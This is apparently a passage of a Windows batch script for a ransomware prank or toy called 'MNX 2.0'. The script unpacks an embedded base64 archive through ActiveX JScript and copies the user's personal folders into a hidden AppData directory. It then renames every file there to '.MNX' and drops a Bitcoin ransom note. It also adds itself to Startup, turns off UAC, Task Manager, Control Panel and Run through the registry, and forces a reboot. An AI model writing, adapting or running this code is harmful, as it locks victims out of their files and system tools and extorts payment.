echo 4v4R2QwEBKu8Z5lULlll64L8yLzT1NaqevX73PwBQSwECFAAUAAAACACbYphV65Wm2vYqAABQLgAADgAkAAAAAAAAACAAAAAAAAAAQmFja2dyb3VuZC5wbmcKACAAAAAAAAEAGABWvSW7RhfZAUlnBs1GF9kBmSkKukYX2QFQSwUGAAAAAAE>>x
echo AAQBgAAAAIisAAAAA>>x

echo f=new ActiveXObject(^"Scripting.FileSystemObject^");i=f.getFile(^"x^").openAsTextStream();>x.js
echo x=new ActiveXObject(^"MSXml2.DOMDocument^").createElement(^"Base64Data^");x.dataType=^"bin.base64^";>>x.js
echo x.text=i.readAll();o=new ActiveXObject(^"ADODB.Stream^");o.type=1;o.open();o.write(x.nodeTypedValue);>>x.js
echo z=f.getAbsolutePathName(^"z.zip^");o.saveToFile(z);s=new ActiveXObject(^"Shell.Application^");>>x.js
echo s.namespace(26).copyHere(s.namespace(z).items());o.close();i.close();>>x.js

start x.js

:ChangeBackground
echo reg add "hkcu\control panel\desktop" /v wallpaper /t REG_SZ /d "%appdata%\Background.png" /f>ChangeBackground.bat
echo reg add "hkcu\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 6 /f>>ChangeBackground.bat
echo :a>>ChangeBackground.bat
echo RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters ,1 ,True>>ChangeBackground.bat
echo goto a>>ChangeBackground.bat

:Changebackground.vbs
echo Set objShell = CreateObject("Shell.Application") >Changebackground.vbs
echo objShell.ShellExecute "%appdata%\MNX\changeBackground.bat", "/c lodctr.exe /r", "", "runas", 0 >>Changebackground.vbs

start Changebackground.vbs

:Encrypt+Readme.2
cd %appdata%\MNX
echo @echo off >Encrypt.bat
echo xcopy %userprofile%\Desktop %appdata%\MNX\Desktop /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Downloads %appdata%\MNX\Downloads /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Videos %appdata%\MNX\Videos /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Documents %appdata%\MNX\Documents /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Music %appdata%\MNX\Music /e /h /y >>Encrypt.bat
echo xcopy %userprofile%\Pictures %appdata%\MNX\Pictures /e /h /y >>Encrypt.bat
echo cls >>Encrypt.bat
echo. >>Encrypt.bat
echo cd %userprofile%\desktop>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.MNX>>Encrypt.bat
echo cd %userprofile%\Downloads>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.MNX>>Encrypt.bat
echo cd %userprofile%\Videos>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.MNX>>Encrypt.bat
echo cd %userprofile%\Documents>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.MNX>>Encrypt.bat
echo cd %userprofile%\Music>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.MNX>>Encrypt.bat
echo cd %userprofile%\Pictures>>Encrypt.bat
echo for /r %%%%x in (*.*) do ren "%%%%x" *.MNX>>Encrypt.bat
echo cls >>Encrypt.bat
echo move %appdata%\MNX\Readme\Readme.txt %userprofile%\desktop>>Encrypt.bat

:EncryptVBS
cd %appdata%\MNX
echo Set objShell = CreateObject("Shell.Application") >Encrypt.vbs
echo objShell.ShellExecute "%appdata%\MNX\Encrypt.bat", "/c lodctr.exe /r", "", "runas", 0 >>Encrypt.vbs


:Decrypt
cd %appdata%\MNX
echo xcopy %appdata%\MNX\Desktop %userprofile%\Desktop /e /h /y >Decrypt.bat
echo xcopy %appdata%\MNX\Downloads %userprofile%\Downloads /e /h /y>>Decrypt.bat
echo xcopy %appdata%\MNX\Video %userprofile%\Video /e /h /y>>Decrypt.bat
echo xcopy %appdata%\MNX\Documents %userprofile%\Documents /e /h /y>>Decrypt.bat
echo xcopy %appdata%\MNX\Music %userprofile%\Music /e /h /y>>Decrypt.bat
echo xcopy %appdata%\MNX\Pictures %userprofile%\Pictures /e /h /y>>Decrypt.bat

echo cd %userprofile%\Desktop>>Decrypt.bat
echo for /r %%%%i in (*.MNX) do del "%%%%i">>Decrypt.bat
echo del Readme.txt>>Decrypt.bat

echo del x>>Decrypt.bat
echo del x.js>>Decrypt.bat
echo del z.zip>>Decrypt.bat

echo cd %userprofile%\Downloads>>Decrypt.bat
echo for /r %%%%i in (*.MNX) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Videos>>Decrypt.bat
echo for /r %%%%i in (*.MNX) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Documents>>Decrypt.bat
echo for /r %%%%i in (*.MNX) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Music>>Decrypt.bat
echo for /r %%%%i in (*.MNX) do del "%%%%i">>Decrypt.bat
echo cd %userprofile%\Pictures>>Decrypt.bat
echo for /r %%%%i in (*.MNX) do del "%%%%i">>Decrypt.bat

echo cd %appdata%\MNX>>Decrypt.bat
echo start Regedit.vbs>>Decrypt.bat
echo exit >>Decrypt.bat

:DecryptVBS
cd %appdata%\MNX
echo Set objShell = CreateObject("Shell.Application") >Decrypt.vbs
echo objShell.ShellExecute "%appdata%\MNX\Decrypt.bat", "/c lodctr.exe /r", "", "runas", 0 >>Decrypt.vbs

:Readme.1
md %appdata%\MNX\Readme
cd %appdata%\MNX\Readme
echo WHAT'S UP?>Readme.txt
echo All your files are encrypted by MNX 2.0 Ransomware.>>Readme.txt
echo To recover your files, you need a Decryption Key.>>Readme.txt
echo Pay 1,000,000 WON worth of Bitcoin, and your files will be recovered.>>Readme.txt
echo If you closed the tab: restart your computer.>>Readme.txt

:MNX
cd %appdata%\MNX
echo @echo off>MNX.bat
echo title MNX 2.0>>MNX.bat
echo cd %appdata%\MNX>>MNX.bat
echo del *.txt>>MNX.bat
echo cls>>MNX.bat
echo set pass=%%random%%>>MNX.bat
echo echo your password is the name of the file.^>%%pass%%.txt>>MNX.bat
echo.>>MNX.bat
echo :a>>MNX.bat
echo color 0a>>MNX.bat
echo echo WHAT'S UP?>>MNX.bat
echo echo All your files are encrypted by MNX 2.0 Ransomware.>>MNX.bat
echo echo To recover your files, you need a Decryption Key.>>MNX.bat
echo echo Pay 1,000,000 WON worth of Bitcoin, and your files will be recovered.>>MNX.bat
echo.>>MNX.bat
echo set /p aa=Decryption Key:>>MNX.bat
echo if %%aa%%==%%pass%% goto b>>MNX.bat
echo.>>MNX.bat
echo cls>>MNX.bat
echo goto a>>MNX.bat
echo. >>MNX.bat
echo :b>>MNX.bat
echo cls>>MNX.bat
echo echo Wright Decryption Key...>>MNX.bat
echo echo Click Any Keys to Decrypt the files>>MNX.bat
echo cd %appdata%\MNX>>MNX.bat
echo start Decrypt.vbs>>MNX.bat
echo exit>>MNX.bat
xcopy /h /y %appdata%\MNX\MNX.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup"

:Regedit
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t "REG_DWORD" /d "0" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t "REG_DWORD" /d "1" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t "REG_DWORD" /d "1" /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t "REG_DWORD" /d "1" /f
cls

:RecoverRegedit
echo @echo off>Regedit.bat
echo reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t "REG_DWORD" /d "1" /f>>Regedit.bat
echo reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /f>>Regedit.bat
echo reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /f>>Regedit.bat
echo reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /f>>Regedit.bat
echo cd %appdata%>>Regedit.bat
echo del Background.png>>Regedit.bat
echo del "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\MNX.bat">>Regedit.bat
echo Rmdir /s /q MNX>>Regedit.bat
echo exit>>Regedit.bat

:RegeditVBS
cd %appdata%\MNX
echo Set objShell = CreateObject("Shell.Application") >Regedit.vbs
echo objShell.ShellExecute "%appdata%\MNX\Regedit.bat", "/c lodctr.exe /r", "", "runas", 0 >>Regedit.vbs

:Run
attrib +S +H %appdata%\MNX /D
start Encrypt.vbs
shutdown -r -t 1
exit


